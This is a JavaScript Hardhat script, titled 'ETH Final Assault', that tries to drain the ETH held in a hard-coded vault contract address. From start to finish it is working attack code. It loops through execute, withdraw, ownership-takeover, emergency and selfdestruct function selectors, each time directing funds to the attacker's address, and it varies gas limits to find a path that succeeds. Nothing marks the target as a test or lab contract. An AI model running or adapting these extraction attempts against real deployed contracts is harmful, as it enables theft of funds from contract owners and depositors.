const { ethers } = require("hardhat");

const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";

/**
 * @title ETH Final Assault
 * @notice Comprehensive ETH extraction attempt using all discovered vectors
 * @dev Combines all successful patterns from previous attempts
 */
async function main() {
  console.log("\nâš”ï¸ ETH FINAL ASSAULT");
  console.log("=====================================");
  
  const [attacker] = await ethers.getSigners();
  
  // Initial state
  const initialVaultETH = await ethers.provider.getBalance(VAULT_ADDRESS);
  const initialAttackerETH = await ethers.provider.getBalance(attacker.address);
  
  console.log("\nðŸ“Š Initial State:");
  console.log("Vault ETH:", ethers.formatEther(initialVaultETH));
  console.log("Attacker ETH:", ethers.formatEther(initialAttackerETH));
  
  // Key findings from previous attempts:
  // 1. Vault accepts ETH (has receive/fallback)
  // 2. Contains call, delegatecall, selfdestruct opcodes
  // 3. Admin functions execute but don't transfer
  // 4. 54 function selectors available
  
  console.log("\nðŸŽ¯ Attack Strategy:");
  console.log("1. Force vault to call attacker with ETH");
  console.log("2. Exploit execute functions with crafted calldata");
  console.log("3. Trigger emergency functions as admin");
  console.log("4. Use gas manipulation on withdrawal functions");
  
  // Attack 1: Execute functions with ETH value
  console.log("\nðŸ”¥ Attack 1: Execute with ETH value");
  
  const executePatterns = [
    {
      selector: "0x1cff79cd",
      name: "execute(address,bytes)",
      encode: (target, amount) => ethers.AbiCoder.defaultAbiCoder().encode(
        ["address", "bytes"],
        [target, "0x"]
      )
    },
    {
      selector: "0xb61d27f6",
      name: "execute(address,uint256,bytes)",
      encode: (target, amount) => ethers.AbiCoder.defaultAbiCoder().encode(
        ["address", "uint256", "bytes"],
        [target, amount, "0x"]
      )
    },
    {
      selector: "0x7535d246",
      name: "executeCall(address,uint256,bytes)",
      encode: (target, amount) => ethers.AbiCoder.defaultAbiCoder().encode(
        ["address", "uint256", "bytes"],
        [target, amount, "0x"]
      )
    }
  ];
  
  for (const pattern of executePatterns) {
    try {
      console.log(`\nTrying ${pattern.name}:`);
      
      // Try to make vault send all ETH to attacker
      const data = pattern.selector + pattern.encode(
        attacker.address,
        initialVaultETH
      ).slice(2);
      
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: data,
        gasLimit: 1000000
      });
      const receipt = await tx.wait();
      
      console.log("Gas used:", receipt.gasUsed.toString());
      
      const newVaultETH = await ethers.provider.getBalance(VAULT_ADDRESS);
      if (newVaultETH < initialVaultETH) {
        console.log(`âœ… SUCCESS! Extracted ${ethers.formatEther(initialVaultETH - newVaultETH)} ETH`);
        return; // Exit on success
      }
    } catch (e) {
      console.log("Failed:", e.reason || "Unknown error");
    }
  }
  
  // Attack 2: Withdrawal functions with specific gas amounts
  console.log("\nðŸ”¥ Attack 2: Gas-manipulated withdrawals");
  
  const withdrawalFunctions = [
    { selector: "0x3ccfd60b", name: "withdraw()" },
    { selector: "0x4782f779", name: "withdrawETH()" },
    { selector: "0xe9fad8ee", name: "withdrawETH()" },
    { selector: "0x853828b6", name: "withdrawAll()" },
    { selector: "0xf14210a6", name: "withdrawETH(uint256)" },
    { selector: "0x5fd8c710", name: "withdrawBalance()" },
    { selector: "0xdb2e21bc", name: "emergencyWithdraw()" },
    { selector: "0x5312ea8e", name: "emergencyETH()" }
  ];
  
  // Try each with different gas amounts
  const gasAmounts = [2300, 10000, 50000, 100000, 500000, 1000000];
  
  for (const func of withdrawalFunctions) {
    for (const gas of gasAmounts) {
      try {
        let data = func.selector;
        
        // Add amount parameter if needed
        if (func.name.includes("uint256")) {
          data += ethers.AbiCoder.defaultAbiCoder().encode(
            ["uint256"],
            [initialVaultETH]
          ).slice(2);
        }
        
        const tx = await attacker.sendTransaction({
          to: VAULT_ADDRESS,
          data: data,
          gasLimit: gas
        });
        await tx.wait();
        
        const newVaultETH = await ethers.provider.getBalance(VAULT_ADDRESS);
        if (newVaultETH < initialVaultETH) {
          console.log(`âœ… ${func.name} with ${gas} gas extracted ${ethers.formatEther(initialVaultETH - newVaultETH)} ETH`);
          return;
        }
      } catch (e) {
        // Silently continue
      }
    }
  }
  
  // Attack 3: Admin emergency functions
  console.log("\nðŸ”¥ Attack 3: Admin emergency functions");
  
  // First become admin (we know this works)
  const adminFunctions = ["0x13af4035", "0xf2fde38b", "0x8fc866da"];
  
  for (const selector of adminFunctions) {
    try {
      const data = selector + ethers.AbiCoder.defaultAbiCoder().encode(
        ["address"],
        [attacker.address]
      ).slice(2);
      
      await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: data,
        gasLimit: 100000
      });
    } catch (e) {}
  }
  
  // Now try emergency functions
  const emergencyFunctions = [
    "0xdb2e21bc", // emergencyWithdraw
    "0x5312ea8e", // emergencyETH
    "0x00f55d9d", // kill
    "0x83197ef0", // destroy
    "0x9cb8a26a", // self
  ];
  
  for (const selector of emergencyFunctions) {
    try {
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: selector,
        gasLimit: 500000
      });
      await tx.wait();
      
      const newVaultETH = await ethers.provider.getBalance(VAULT_ADDRESS);
      if (newVaultETH < initialVaultETH) {
        console.log(`âœ… ${selector} extracted ${ethers.formatEther(initialVaultETH - newVaultETH)} ETH`);
        return;
      }
    } catch (e) {}
  }
  
  // Attack 4: Selfdestruct with beneficiary
  console.log("\nðŸ”¥ Attack 4: Selfdestruct with beneficiary");
  
  const destructPatterns = [
    { selector: "0x00f55d9d", params: ["address"] },
    { selector: "0x83197ef0", params: ["address"] },
    { selector: "0x41c0e1b5", params: [] },
    { selector: "0x9cb8a26a", params: ["address"] }
  ];
  
  for (const pattern of destructPatterns) {
    try {
      let data = pattern.selector;
      
      if (pattern.params.includes("address")) {
        data += ethers.AbiCoder.defaultAbiCoder().encode(
          ["address"],
          [attacker.address]
        ).slice(2);
      }
      
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: data,
        gasLimit: 500000
      });
      await tx.wait();
      
      // Check if vault was destroyed
      const vaultCode = await ethers.provider.getCode(VAULT_ADDRESS);
      if (vaultCode === "0x") {
        console.log(`âœ… Vault destroyed with ${pattern.selector}`);
        const attackerGain = (await ethers.provider.getBalance(attacker.address)) - initialAttackerETH;
        if (attackerGain > 0n) {
          console.log(`Received ${ethers.formatEther(attackerGain)} ETH`);
        }
        return;
      }
    } catch (e) {}
  }
  
  // Final check
  const finalVaultETH = await ethers.provider.getBalance(VAULT_ADDRESS);
  const finalAttackerETH = await ethers.provider.getBalance(attacker.address);
  
  console.log("\nðŸ“Š FINAL RESULTS:");
  console.log("=====================================");
  console.log("Vault ETH:", ethers.formatEther(finalVaultETH));
  console.log("ETH Extracted:", ethers.formatEther(initialVaultETH - finalVaultETH));
  
  if (finalVaultETH < initialVaultETH) {
    console.log("\nðŸŽ‰ SUCCESS! Extraction method found!");
  } else {
    console.log("\nâŒ All ETH extraction attempts failed");
    console.log("\nConclusion: The vault appears to have no exploitable ETH withdrawal mechanism");
    console.log("despite having ETH-related opcodes and admin access.");
  }
}

main().catch((error) => {
  console.error("\nðŸ’¥ Script error:", error);
  process.exit(1);
});
